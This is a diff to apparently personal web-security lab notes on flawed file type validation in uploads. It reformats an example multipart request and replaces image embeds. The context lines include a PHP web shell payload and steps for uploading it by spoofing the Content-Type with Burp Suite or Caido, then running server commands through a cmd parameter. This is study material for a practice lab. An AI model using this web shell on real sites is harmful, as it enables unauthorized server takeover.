@@ -112,8 +112,17 @@ When submitting HTML forms, the browser typically sends the provided data in a `
 ## Flawed file type validation - Continued
 
 Consider a form containing fields for uploading an image, providing a description of it, and entering your username. Submitting such a form might result in a request that looks something like this:
-
-```POST /images HTTP/1.1 Host: normal-website.com Content-Length: 12345 Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456 ---------------------------012345678901234567890123456 Content-Disposition: form-data; name="image"; filename="example.jpg" Content-Type: image/jpeg [...binary content of example.jpg...] ---------------------------012345678901234567890123456 Content-Disposition: form-data; name="description" This is an interesting description of my image. ---------------------------012345678901234567890123456 Content-Disposition: form-data; name="username" wiener ---------------------------012345678901234567890123456--
+```
+POST /images HTTP/1.1 Host: normal-website.com 
+Content-Length: 12345 
+Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456 ---------------------------012345678901234567890123456 
+Content-Disposition: form-data; name="image"; filename="example.jpg" 
+Content-Type: image/jpeg [...binary content of example.jpg...] 
+---------------------------012345678901234567890123456 Content-Disposition: form-data; 
+name="description" This is an interesting description of my image. 
+---------------------------012345678901234567890123456 Content-Disposition: form-data; 
+name="username" wiener 
+---------------------------012345678901234567890123456--
 ```
 
 As you can see, the message body is split into separate parts for each of the form's inputs. Each part contains a `Content-Disposition` header, which provides some basic information about the input field it relates to. These individual parts may also contain their own `Content-Type` header, which tells the server the MIME type of the data that was submitted using this input.
@@ -146,12 +155,14 @@ One way that websites may attempt to validate file uploads is to check that this
 1. At first login to the account -> then create a payload of that script (basic exploit) "<?php echo system($_GET['cmd']); ?>"
 2. Then upload to the uploadable function ->  then that shows and error -> go to burpsuite or caido **http-history** There you can see the `POST` method where the file uploaded 
 3. Send that to repeter and then just change the function to uploadable file like `image` or anything by changing the `x-php` function like the given image.
-![[Screenshot_20260111_234300.png]]
+<img width="1529" height="1005" alt="Screenshot_20260111_234300" src="https://github.com/user-attachments/assets/ee7e4848-08c1-408a-94d3-8ef38e499bd0" />
 4. Then just go back to the website and check the avater image or image viewable function and click to open and execute that in other tab -> there you can see that your exploit name is appearing.
-![[Screenshot_20260111_234332.png]]
-![[Screenshot_20260111_234316.png]]
+<img width="1190" height="912" alt="Screenshot_20260111_234332" src="https://github.com/user-attachments/assets/25fb52e6-d6cf-4c4e-9f9e-ebee5593355c" />
+
+<img width="938" height="244" alt="Screenshot_20260111_234316" src="https://github.com/user-attachments/assets/75687076-d4e9-4530-aa9a-e3b84d5180a5" />
+
 5. Now add `?cmd=ls` to test that is your function is working or not. if it is then just go back yo buirpsuite or caido and then go to `http-history` and find that `cmd=ls` **http-history** then send it to repeter or replay.
-![[Screenshot_20260111_234240.png]]
+<img width="1536" height="1039" alt="Screenshot_20260111_234240" src="https://github.com/user-attachments/assets/a9e80cab-4f20-4c3b-849c-b4cda113f139" />
 6. Then you can able to execute any type of arbitary command what you want. You got an access of that server.
 
 --- 
